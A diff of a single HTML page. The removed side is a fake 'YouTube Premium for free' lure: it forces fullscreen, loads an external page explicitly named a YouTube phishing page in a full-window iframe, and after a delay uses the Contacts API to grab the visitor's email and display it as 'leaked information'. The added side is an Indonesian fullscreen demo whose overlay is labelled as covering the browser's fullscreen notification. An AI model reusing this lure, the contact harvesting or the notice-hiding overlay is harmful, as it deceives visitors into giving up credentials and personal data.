@@ -1,61 +1,140 @@
-<html>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Full Screen dengan Overlay</title>
+<style>
+  html, body {
+    margin: 0; padding: 0; height: 100%;
+    font-family: sans-serif;
+    overflow: hidden;
+  }
+
+  button {
+    position: fixed;
+    padding: 12px 24px;
+    font-size: 16px;
+    cursor: pointer;
+    border: none;
+    border-radius: 6px;
+    background-color: #007bff;
+    color: white;
+    user-select: none;
+    z-index: 1001;
+  }
+
+  #fsBtn {
+    top: 20px;
+    left: 20px;
+  }
+
+  #exitBtn {
+    bottom: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    display: none;
+  }
+
+  #overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw;
+    height: 100vh;
+    background-color: white;
+    z-index: 999999;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 2rem;
+    color: black;
+    user-select: none;
+    text-align: center;
+    padding: 0 20px;
+  }
+</style>
+</head>
+<body>
+
+<button id="fsBtn">Masuk Full Screen</button>
+<button id="exitBtn">Keluar Full Screen</button>
+
+<div id="overlay">Full Screen Aktif<br>Notifikasi Browser Ditutupi oleh Overlay</div>
 
 <script>
+  const fsBtn = document.getElementById('fsBtn');
+  const exitBtn = document.getElementById('exitBtn');
+  const overlay = document.getElementById('overlay');
 
-function fullscreen_contents() { 
-document.documentElement.requestFullscreen();
-                document.getElementById("replace")
+  // Fungsi untuk request full screen dengan fallback vendor prefix
+  function requestFullscreen(element) {
+    if (element.requestFullscreen) {
+      return element.requestFullscreen();
+    } else if (element.webkitRequestFullscreen) {
+      return element.webkitRequestFullscreen();
+    } else if (element.msRequestFullscreen) {
+      return element.msRequestFullscreen();
+    } else if (element.mozRequestFullScreen) {
+      return element.mozRequestFullScreen();
+    } else {
+      return Promise.reject(new Error('Fullscreen API tidak didukung'));
+    }
+  }
 
-                .outerHTML = "<meta name='viewport' content='width=device-width, initial-scale=1'> <link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css'> <iframe class='embed-responsive-item' src='https://pinkythegawd.github.io/youtube-phishing-page/' frameborder='0' style=' overflow: hidden; overflow-x: hidden; overflow-y: hidden; height: 100%; width: 100%; position: absolute; top: 0px; left: 0px; right: 0px; bottom: 0px; ' height='100%' width='100%'></iframe>";
+  // Fungsi untuk keluar full screen dengan fallback vendor prefix
+  function exitFullscreen() {
+    if (document.exitFullscreen) {
+      return document.exitFullscreen();
+    } else if (document.webkitExitFullscreen) {
+      return document.webkitExitFullscreen();
+    } else if (document.msExitFullscreen) {
+      return document.msExitFullscreen();
+    } else if (document.mozCancelFullScreen) {
+      return document.mozCancelFullScreen();
+    } else {
+      return Promise.reject(new Error('Fullscreen API tidak didukung'));
+    }
+  }
 
-}
+  // Cek apakah sedang full screen
+  function isFullscreen() {
+    return !!(document.fullscreenElement || document.webkitFullscreenElement || document.msFullscreenElement || document.mozFullScreenElement);
+  }
 
+  // Event klik masuk full screen
+  fsBtn.addEventListener('click', () => {
+    requestFullscreen(document.documentElement).catch(err => {
+      alert('Gagal masuk full screen: ' + err.message);
+    });
+  });
 
-function async () {
+  // Event klik keluar full screen
+  exitBtn.addEventListener('click', () => {
+    exitFullscreen().catch(err => {
+      alert('Gagal keluar full screen: ' + err.message);
+    });
+  });
 
+  // Update UI saat mode full screen berubah
+  function onFullscreenChange() {
+    if (isFullscreen()) {
+      overlay.style.display = 'flex';
+      exitBtn.style.display = 'block';
+      fsBtn.style.display = 'none';
+    } else {
+      overlay.style.display = 'none';
+      exitBtn.style.display = 'none';
+      fsBtn.style.display = 'block';
+    }
+  }
 
-                (async () => {
-
-                    let contacts = await navigator.contacts.select(["email"],{});
-
-                   document.write(`
-                        <h1>
-                            <font color="red">Leaked information:</font> 
-Email =
-${contacts[0]["email"]}
-
-
-</font>
-                        </h1> 
-                    `);
-                })();
-
-
-
-
-            }
-
-
+  // Dengarkan perubahan full screen di berbagai browser
+  document.addEventListener('fullscreenchange', onFullscreenChange);
+  document.addEventListener('webkitfullscreenchange', onFullscreenChange);
+  document.addEventListener('mozfullscreenchange', onFullscreenChange);
+  document.addEventListener('MSFullscreenChange', onFullscreenChange);
 </script>
 
- 
-<center>
-
-
-<div id="replace"
-
-style="font-size: 50px; 
-font-weight: bold;">
-
-Youtube Premium For Free
-
-<h3> 1. Go to 
-<a href="#" onclick="setTimeout('async()','5000');fullscreen_contents()">Youtube.com</a>
-</h3>
-<h3> 2. Click on "TRY IT FREE" </h3>
-<h3> 3. Choose your Email Id </h3>
-<h3> 4. SignIn with your email </h3>
-        </div>
-
-</center>
+</body>
 </html>
